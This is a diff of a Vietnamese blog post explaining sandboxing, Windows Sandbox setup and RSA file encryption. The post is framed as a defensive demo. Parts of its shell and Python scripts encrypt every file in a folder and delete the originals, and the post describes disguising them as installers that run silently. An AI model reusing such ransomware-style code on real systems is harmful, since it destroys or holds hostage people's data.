@@ -14,7 +14,7 @@ comments: true
 ---
 Trong thời đại công nghệ ngày nay, mối lo ngại về bảo mật ngày càng trở nên nghiêm trọng. Cả máy tính cá nhân và điện thoại di động đều dễ bị hacker xâm nhập nếu người dùng không cẩn thận khi duyệt web hoặc tải ứng dụng từ các nguồn không đáng tin cậy. Điều này tạo ra nguy cơ tiềm ẩn cho việc mất mát thông tin cá nhân, đặc biệt là thông tin tài khoản ngân hàng.
 
-### Sandbox là gì?
+### ⚙️ Sandbox là gì?
 
 Sandbox là một kỹ thuật cô lập các ứng dụng để bảo vệ máy tính hoặc điện thoại khỏi phần mềm độc hại và ngăn chúng xâm nhập và gây hỏng hóc hệ thống hoặc rò rỉ thông tin cá nhân.
 
@@ -24,7 +24,7 @@ Sandbox là một kỹ thuật cô lập các ứng dụng để bảo vệ máy
 
 Trong máy tính, mỗi ứng dụng thường chia sẻ một không gian bộ nhớ và CPU chung. Điều này có thể dẫn đến việc một ứng dụng chiếm hết tài nguyên của hệ thống mà không có kiểm soát. Sandbox cô lập các ứng dụng trong một môi trường an toàn, ngăn chúng gây hại cho hệ thống.
 
-### Tính Năng Nổi Bật của Sandbox
+### ⚙️ Tính Năng Nổi Bật của Sandbox
 
 Sandbox đi kèm với các tính năng hữu ích sau:
 
@@ -33,7 +33,7 @@ Sandbox đi kèm với các tính năng hữu ích sau:
 - **Giao diện thân thiện**: Cung cấp giao diện dễ sử dụng, thân thiện với người dùng.
 - **Hiệu suất cao**: Đạt hiệu suất cao, xử lý mượt mà, không gây gián đoạn trong quá trình sử dụng.
 
-### Nếu không có sandbox, các chương trình có thể gặp phải các vấn đề sau:
+### ⚙️ Nếu không có sandbox, các chương trình có thể gặp phải các vấn đề sau:
 
 1. **Xâm nhập từ phần mềm độc hại**: Thiếu cơ chế cô lập, chương trình có thể bị tấn công bởi phần mềm độc hại, dẫn đến lỗ hổng bảo mật và mất thông tin quan trọng.
 2. **Xung đột tài nguyên**: Các chương trình chia sẻ tài nguyên hệ thống mà không có sự kiểm soát có thể gây ra xung đột, làm gián đoạn hoạt động của hệ thống.
@@ -41,7 +41,7 @@ Sandbox đi kèm với các tính năng hữu ích sau:
 4. **Lỗi hoạt động**: Không có sự cô lập, các lỗi hoạt động của một chương trình có thể ảnh hưởng đến toàn bộ hệ thống, gây ra sự cố và crash.
 5. **Phân mảnh tài nguyên**: Sự phân mảnh tài nguyên hệ thống có thể xảy ra khi nhiều chương trình cùng sử dụng tài nguyên hệ thống mà không được quản lý.
 
-#### Nhiễm các chương trình độc hại
+#### ⚙️ Nhiễm các chương trình độc hại
 
 Giả sử một tình huống, có một ứng dụng chia sẻ máy tính của bạn với tất cả các ứng dụng đang chạy khác, và một trong số các chương trình đó chứa thông tin nhạy cảm của bạn. Khi các ứng dụng không có sandbox, các ứng dụng độc hại tồn tại trên máy bạn sẽ luôn thăm dò các khu vực lưu thông tin bảo mật trên các ứng dụng đó, tìm ra các lỗ hổng của chương trình và đánh cắp thông tin nhạy cảm của bạn.
 
@@ -51,13 +51,13 @@ Giả sử một tình huống, có một ứng dụng chia sẻ máy tính củ
 
 Sandbox sẽ là giải pháp hữu hiệu giải quyết các vấn đề đó. Nó cung cấp khả năng bảo vệ các chương trình và chống lại các chương trình độc hại. Khi một ứng dụng chạy trong sandbox, nó chỉ có thể truy cập vào các khu vực bộ nhớ đã được cấp phép cho nó. Vì vậy, việc mở các tài liệu nhạy cảm sẽ ngăn không cho các malware hay ứng dụng độc hại xâm nhập, vì tài liệu này không nằm cùng khu vực bộ nhớ với các chương trình độc hại đó.
 
-### Một số nền tảng sử dụng sandbox
+### ⚙️ Một số nền tảng sử dụng sandbox
 
-#### Sandbox trình duyệt
+#### ⚙️ Sandbox trình duyệt
 
-#### PDF, Microsoft Office
+#### ⚙️ PDF, Microsoft Office
 
-#### Ứng dụng Windows
+#### ⚙️ Ứng dụng Windows
 
 - Máy ảo
 
@@ -76,9 +76,9 @@ Windows Sandbox là một môi trường ảo hoá của Microsoft, ngay bên tr
     <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%2013.png">
 </div>
 
-### Cách kích hoạt sandbox trên Windows 10
+### ⚙️ Cách kích hoạt sandbox trên Windows 10
 
-#### Điều kiện để chạy sandbox trên Windows 10
+#### ⚙️ Điều kiện để chạy sandbox trên Windows 10
 
 Máy tính bạn phải đạt được yêu cầu cấu hình tối thiểu sau:
 
@@ -99,7 +99,7 @@ Tại đây, hãy kiểm tra dòng **Virtualization**, nếu **Enable** tức
     <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%204.png">
 </div>
 
-#### Cách kích hoạt Sandbox Windows 10
+#### ⚙️ Cách kích hoạt Sandbox Windows 10
 
 **Bước 1**: Kích hoạt tính năng Sandbox Windows 10
 
@@ -117,6 +117,8 @@ Tìm đến 3 tính năng là **Virtual Machine Platform**, **Windows Hypervisor
 
 <div class="post-img-post">
     <img src="/img/2024-04-10-What-Is-a-Sandbox-Environment/Untitled%207.png">
+    <br>
+    Khởi động lại máy tính
 </div>
 
 Khởi động lại máy tính
@@ -172,37 +174,42 @@ Ví dụ, trường hợp tôi cài đặt một phần mềm Git với một đ
 </div>
 
 
-### Nói về mã hoá tệp tin
+### ⚙️ Nói về mã hoá tệp tin
 
 {: .box-error}
 **Lưu ý:** Những script dưới đây mang tính chất demo, không sử dụng trong mục đích khác!
 
-#### RSA
+-----------------------------
+#### ⚙️ RSA
 
 RSA là một thuật toán mã hóa không đối xứng được sử dụng rộng rãi trên internet với HTTPS. Nó cho phép mã hóa dữ liệu bằng một khóa và chỉ có thể giải mã bằng khóa còn lại trong cặp khóa. Điều này hữu ích khi cần mã hóa dữ liệu giữa nhiều bên khác nhau và chỉ cần tồn tại một cặp khóa cho mỗi bên. Để tạo cặp khóa, người dùng chọn độ dài bit và thực hiện tạo khóa, nhưng thời gian tạo khóa có thể lâu tùy thuộc vào độ dài bit được chọn.
 
-#### Tạo Khóa Riêng
+-----------------------------
+#### ⚙️ Tạo Khóa Riêng
 Chạy lệnh này để tạo một khóa riêng 4096-bit và xuất nó ra tệp `private.pem`. Nếu bạn muốn, bạn có thể thay đổi độ dài khóa và/hoặc tệp xuất.
 
 ```bash
 $ openssl genrsa 
 ```
 
-#### Tính Toán Khóa Công Khai
+-----------------------------
+#### ⚙️ Tính Toán Khóa Công Khai
 Với một khóa riêng, bạn có thể tính toán được khóa công khai của nó và xuất ra tệp `public.pem` bằng lệnh này. (Bạn cũng có thể dán khóa riêng được tạo bởi OpenSSL vào biểu mẫu ở trên để nhận được khóa công khai của nó.)
 
 ```bash
 $ openssl rsa -in private.pem -pubout -out public.pem
 ```
 
-#### Mã Hóa Dữ Liệu
+-----------------------------
+#### ⚙️ Mã Hóa Dữ Liệu
 Bây giờ chúng ta có thể sử dụng cặp khóa này để mã hóa và giải mã một tệp, `data.txt`.
 
 ```bash
 $ openssl rsautl -encrypt -inkey public.pem -pubin -in data.txt -out data.txt.enc
 ```
 
-#### Giải Mã Dữ Liệu
+-----------------------------
+#### ⚙️ Giải Mã Dữ Liệu
 Với tệp đã được mã hóa từ bước trước, bạn có thể giải mã như sau.
 
 ```bash
@@ -260,12 +267,13 @@ awIDAQAB
 {: .box-note}
 **Note:** Tôi tạo những script dưới đây để thực hiện demo của mình!
 
-#### Script encrypt - mã hóa dữ liệu
+-----------------------------
+#### ⚙️ Script encrypt - mã hóa dữ liệu
 
 > *Giả sử đoạn script đã được ngụy trang bên trong một lớp vỏ bọc hoàn hảo và bạn đã tải về máy tính của bạn! Và bạn không ngần ngại thực thi file cài đặt này! Hoặc nó tự động active :)) Và Bùmmm!!!*
 
 ```sh
-### encrypt.sh
+### ⚙️ encrypt.sh
 for i in `find . -type f ! \( -name "public.pem" -o -name "encrypt.sh" \)` ;
 do 	
 	echo ">>>encrypt $i";	
@@ -293,7 +301,8 @@ done
 {: .box-warning}
 **Warning:** Thực tế ở trường hợp này, hacker có thể cho xóa **"public.pem"** (tuy không còn quan trọng vì mã hóa bất đối xứng) và **"encrypt.sh"** sau khi thực thi tệp và tạo thêm một tệp thông tin tống tiền, đồng thời cho phát tán các mã độc khác đi khắp mạng máy tính trong nhà.
 
-#### Script decrypt - giải mã dữ liệu
+-----------------------------
+#### ⚙️ Script decrypt - giải mã dữ liệu
 
 ```sh
 ## decrypt.sh
@@ -318,11 +327,13 @@ done
 {: .box-note}
 **Note:** Ví dụ này, việc **hack vào một hệ thống trái phép** gồm các quy trình phức tạp và **phạm pháp**, bài viết **giúp** cho **người đọc thấy được việc data bị mã hóa** sẽ trông như thế nào!
 
-#### Script encrypt Python - mã hóa dữ liệu
+-----------------------------
+#### ⚙️ Script encrypt Python - mã hóa dữ liệu
 
 > Đoạn mã Python dưới đây dược sử dụng để mã hóa dữ liệu được tôi chuyển đổi từ script **encrypt.sh** phía trên, nó có thể được đóng gói thành file *.exe và cài đặt thực thi ngầm khi bạn tải về!
 
 ```python
+# test.py
 import os
 import subprocess
 
@@ -343,7 +354,7 @@ awIDAQAB
 with open("temp_public.pem", "w") as f:
     f.write(public_pem)
 
-# Tìm tất cả các tệp trong thư mục hiện tại trừ private.pem, public.pem và test.sh
+# Tìm tất cả các tệp trong thư mục hiện tại trừ temp_public.pem và test.py
 files = [f for f in os.listdir('.') if os.path.isfile(f) and f not in [ "test.py", "temp_public.pem"]]
 
 # Lặp qua từng tệp và mã hóa, sau đó xóa
@@ -358,7 +369,69 @@ os.remove("temp_public.pem")
 
 ```
 
-#### Script encrypt C-lang - mã hóa dữ liệu
+-----------------------------
+#### ⚙️ Script encrypt Python ver2.0
+
+> Đoạn mã Python dưới đây dược sử dụng để **mã hóa và giải mã** dữ liệu
+
+Để sử dụng mã này, bạn cần cài đặt thư viện **pycryptodome** bằng cách chạy lệnh sau trong môi trường Python của bạn:
+
+```
+pip install pycryptodome
+```
+
+```python
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+
+def generate_key_pair():
+    key = RSA.generate(2048)
+    private_key = key.export_key()
+    public_key = key.publickey().export_key()
+    return private_key, public_key
+
+def save_key(key, filename):
+    with open(filename, 'wb') as f:
+        f.write(key)
+
+def load_key(filename):
+    with open(filename, 'rb') as f:
+        return f.read()
+
+def encrypt_file(public_key, filename):
+    recipient_key = RSA.import_key(public_key)
+    cipher_rsa = PKCS1_OAEP.new(recipient_key)
+    with open(filename, 'rb') as f:
+        data = f.read()
+    encrypted_data = cipher_rsa.encrypt(data)
+    with open(filename + '.encrypted', 'wb') as f:
+        f.write(encrypted_data)
+
+def decrypt_file(private_key, encrypted_filename, decrypted_filename):
+    key = RSA.import_key(private_key)
+    cipher_rsa = PKCS1_OAEP.new(key)
+    with open(encrypted_filename, 'rb') as f:
+        encrypted_data = f.read()
+    decrypted_data = cipher_rsa.decrypt(encrypted_data)
+    with open(decrypted_filename, 'wb') as f:
+        f.write(decrypted_data)
+
+# Generate key pair
+private_key, public_key = generate_key_pair()
+save_key(private_key, 'private_key.pem')
+save_key(public_key, 'public_key.pem')
+
+# Encrypt file using public key
+encrypt_file(public_key, 'example.txt')
+
+# Decrypt file using private key
+decrypt_file(private_key, 'example.txt.encrypted', 'decrypted_example.txt')
+
+```
+
+-----------------------------
+
+#### ⚙️ Script encrypt C-lang - mã hóa dữ liệu
 
 > Đoạn mã C-lang dưới đây dược sử dụng để mã hóa dữ liệu được tôi chuyển đổi từ script **encrypt.sh** phía trên, nó có thể được đóng gói thành file linux và cài đặt thực thi ngầm khi bạn tải về!
 
@@ -457,7 +530,7 @@ int main() {
     Kết quả mã hóa dữ liệu
 </div>
 
-### Lời Khuyên Để Tránh Bị Tin Tặc Mã Hóa Dữ Liệu
+### ⚙️ Lời Khuyên Để Tránh Bị Tin Tặc Mã Hóa Dữ Liệu
 
 1. **Sử Dụng Phần Mềm An Toàn**: Luôn sử dụng phần mềm mã hóa dữ liệu từ nguồn tin cậy và đã được kiểm định. Hãy chọn các công cụ mã hóa dữ liệu đã được phê duyệt và được sử dụng rộng rãi trong cộng đồng.
 
